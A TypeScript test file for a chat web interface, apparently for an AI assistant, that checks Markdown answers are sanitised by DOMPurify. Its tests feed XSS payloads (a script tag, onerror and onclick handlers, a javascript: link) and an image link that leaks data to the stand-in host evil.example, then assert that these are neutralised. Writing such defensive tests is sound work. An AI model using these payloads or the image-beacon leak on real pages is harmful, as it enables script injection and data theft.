// Copyright 2026 openduo
// SPDX-License-Identifier: FSL-1.1-Apache-2.0

/**
 * The brain's answers render as Markdown, cleaned by DOMPurify, in a real DOM (jsdom). Markup that
 * could run code never survives; the person's own typed text stays plain text; and the vendored
 * browser modules are the versions the lockfile pins.
 */
import "./web-zh"; // First: the web modules below read the page language when they load.
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

// @ts-expect-error — jsdom ships no types, and @types/jsdom pulls in global fetch types that clash.
import { JSDOM } from "jsdom";
import { describe, expect, it } from "vitest";

// @ts-expect-error — browser-side module without .d.ts
import { createConversation } from "../web/conversation.js";
// @ts-expect-error — browser-side module without .d.ts
import { createMarkdown } from "../web/markdown.js";

const PACKAGE = fileURLToPath(new URL("..", import.meta.url));

/** The few DOM members these cells read; the package's types carry no DOM library. */
type El = {
  textContent: string | null;
  innerHTML: string;
  classList: { contains(name: string): boolean };
  attributes: Iterable<{ name: string }>;
  getAttribute(name: string): string | null;
  querySelector(selector: string): El | null;
  querySelectorAll(selector: string): Iterable<El> & { length: number };
  append(...nodes: El[]): void;
};
type Doc = El & { body: El; createElement(tag: string): El; getElementById(id: string): El | null };
type Win = { document: Doc; pwned?: boolean };

function page() {
  const dom = new JSDOM(
    '<!doctype html><div id="messages"></div><button id="new-message"></button>',
    { runScripts: "dangerously" }
  );
  const window = dom.window as Win;
  const render = createMarkdown(window) as (element: El, text: string) => void;
  const answer = (text: string): El => {
    const element = window.document.createElement("div");
    window.document.body.append(element);
    render(element, text);
    return element;
  };
  return { window, render, answer };
}

describe("an answer rendered as Markdown", () => {
  it("renders a list, a code block, a table and a link", () => {
    const { answer } = page();
    const el = answer(
      [
        "- 一",
        "- 二",
        "",
        "```",
        "const x = 1;",
        "```",
        "",
        "| a | b |",
        "| - | - |",
        "| 1 | 2 |",
        "",
        "[openduo](https://example.com/x)"
      ].join("\n")
    );
    expect([...el.querySelectorAll("ul > li")].map((li) => li.textContent)).toEqual(["一", "二"]);
    expect(el.querySelector("pre > code")?.textContent).toBe("const x = 1;\n");
    expect([...el.querySelectorAll("table td")].map((td) => td.textContent)).toEqual(["1", "2"]);
    const link = el.querySelector("a")!;
    expect(link.getAttribute("href")).toBe("https://example.com/x");
    expect(link.getAttribute("target")).toBe("_blank");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
    expect(el.classList.contains("markdown")).toBe(true);
  });

  it("never runs or keeps a script, an event handler or a javascript: link", async () => {
    const { window, answer } = page();
    const el = answer(
      [
        "<script>window.pwned = true</script>",
        "",
        '<img src="x" onerror="window.pwned = true">',
        "",
        'inline <b onclick="window.pwned = true">b</b>',
        "",
        "[click](javascript:window.pwned=true)"
      ].join("\n")
    );
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(window.pwned).toBeUndefined();
    expect(el.querySelector("script, img, b")).toBeNull();
    for (const node of el.querySelectorAll("*")) {
      for (const attr of node.attributes) expect(attr.name).not.toMatch(/^on/i);
    }
    for (const a of el.querySelectorAll("a")) expect(a.getAttribute("href") ?? "").toBe("");
    // Raw HTML is shown as its text, not dropped silently.
    expect(el.textContent).toContain("<script>window.pwned = true</script>");
  });

  it("fetches no image an answer names", () => {
    const { answer } = page();
    const el = answer("看图 ![p](https://evil.example/p.png?leak=1)");
    expect(el.querySelector("img")).toBeNull();
    expect(el.innerHTML).not.toContain("evil.example");
  });

  it("replaces the whole answer on every update, so a stream never appends fragments", () => {
    const { render, answer } = page();
    const el = answer("**加");
    render(el, "**加粗**");
    render(el, "**加粗** 和 `code`");
    expect(el.querySelectorAll("strong")).toHaveLength(1);
    expect(el.querySelector("strong")?.textContent).toBe("加粗");
    expect(el.textContent?.trim()).toBe("加粗 和 code");
  });
});

describe("the reading column", () => {
  function column() {
    const { window, render } = page();
    const document = window.document;
    const conversation = createConversation({
      $: (id: string) => document.getElementById(id),
      document,
      renderAnswer: render
    });
    return { document, conversation };
  }

  it("keeps the person's typed text literal", () => {
    const { document, conversation } = column();
    conversation.appendLocalMessage("**x** <b>y</b>", { utt_id: "m1", at: "2026-11-01T00:00:00Z" });
    const text = document.querySelector("#messages .message-text")!;
    expect(text.textContent).toBe("**x** <b>y</b>");
    expect(text.querySelector("strong, b")).toBeNull();
  });

  it("renders a streamed and a persisted answer as Markdown", () => {
    const { document, conversation } = column();
    conversation.handleFrame({
      type: "duoduo_said",
      speech_id: "s1",
      kind: "answer",
      text: "**粗"
    });
    conversation.handleFrame({
      type: "duoduo_said",
      speech_id: "s1",
      kind: "answer",
      text: "体**"
    });
    const preview = document.querySelector("[data-said-preview]")!;
    expect(preview.querySelector("strong")?.textContent).toBe("粗体");
    // The persisted row matches its preview by the words and replaces it.
    conversation.handleFrame({
      type: "row",
      row: { seq: 1, kind: "answer", speaker: "多多", at: "2026-11-01T00:00:01Z", text: "**粗体**" }
    });
    expect(document.querySelectorAll("[data-said-preview]")).toHaveLength(0);
    const rows = [...document.querySelectorAll("#messages .message-text")];
    expect(rows).toHaveLength(1);
    expect(rows[0]!.querySelector("strong")?.textContent).toBe("粗体");
  });
});

describe("the vendored browser modules", () => {
  it.each([
    ["marked", "lib/marked.esm.js", "web/vendor/marked.esm.js"],
    ["dompurify", "dist/purify.es.mjs", "web/vendor/purify.es.js"]
  ])("ship %s as the lockfile pins it (run the plugin build after a bump)", (pkg, from, to) => {
    const dir = path.join(PACKAGE, "node_modules", pkg);
    const published = readFileSync(path.join(dir, from), "utf8").replace(
      /\n\/\/# sourceMappingURL=\S+\s*$/,
      "\n"
    );
    expect(readFileSync(path.join(PACKAGE, to), "utf8")).toBe(published);
  });
});
